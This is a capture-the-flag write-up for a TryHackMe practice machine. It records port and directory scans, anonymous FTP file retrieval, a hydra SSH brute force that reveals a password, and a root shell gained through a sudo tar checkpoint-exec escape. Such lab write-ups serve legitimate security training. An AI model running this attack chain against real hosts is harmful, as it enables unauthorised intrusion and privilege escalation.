@@ -1,0 +1,117 @@
+https://tryhackme.com/room/cowboyhacker
+
+nmap
+```
+# Nmap 7.80 scan initiated Wed Aug 12 11:53:28 2020 as: nmap -Pn -sCV -p21,22,80 -oN nmap/Basic_10.10.215.186.nmap 10.10.215.186
+Nmap scan report for 10.10.215.186
+Host is up (0.55s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
+|_-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.9.144
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Aug 12 11:53:52 2020 -- 1 IP address (1 host up) scanned in 24.83 seconds
+```
+
+
+gobuster
+
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.146.164
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,html,txt
+[+] Timeout:        10s
+===============================================================
+2020/08/13 06:38:27 Starting gobuster
+===============================================================
+/images (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)
+```
+
+ftp as anonymous
+
+download task.txt and locks.txt
+
+task is written by lin
+
+brute force ssh using locks.txt
+
+```
+kali@kali:~/Downloads/bountyHunter$ hydra -l lin -P locks.txt 10.10.114.233 -t 4 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 09:49:24
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.114.233:22/
+[22][ssh] host: 10.10.114.233   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-13 09:49:44      
+```
+
+get the first flag
+```
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+```
+
+check priv esc
+```
+lin@bountyhacker:~/Desktop$ sudo -l
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+```
+
+we can run tar as sudo, lets check gtfo bins
+
+```
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+priv esc and get root flag
+
+```
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+```
